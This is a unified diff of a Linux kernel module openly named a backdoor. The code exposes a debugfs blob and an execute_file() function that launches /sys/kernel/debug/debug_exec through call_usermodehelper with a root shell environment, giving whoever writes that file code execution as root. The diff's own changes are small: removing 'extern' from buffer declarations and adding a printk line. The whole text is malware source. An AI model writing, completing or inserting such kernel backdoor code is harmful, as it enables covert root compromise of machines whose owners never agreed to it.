@@ -1,14 +1,15 @@
 #include <linux/debugfs.h>
 #include "backdoor.h"
 
-extern unsigned char *buffer;
-extern unsigned long buffer_length;
+unsigned char *buffer;
+unsigned long buffer_length;
 
 struct dentry *dfs = NULL;
 struct debugfs_blob_wrapper *myblob = NULL;
 
 void execute_file(void){
 	struct subprocess_info *sub_info;
+
 	static char *envp[] = {
 		"SHELL=/bin/bash",
 		"HOME=/root/",
@@ -24,6 +25,8 @@ void execute_file(void){
 		"/sys/kernel/debug/debug_exec",
 		NULL
 	};
+
+	printk("Execute file called!\n");
 
 	sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC, NULL, NULL, NULL);
 	call_usermodehelper_exec(sub_info, UMH_NO_WAIT);
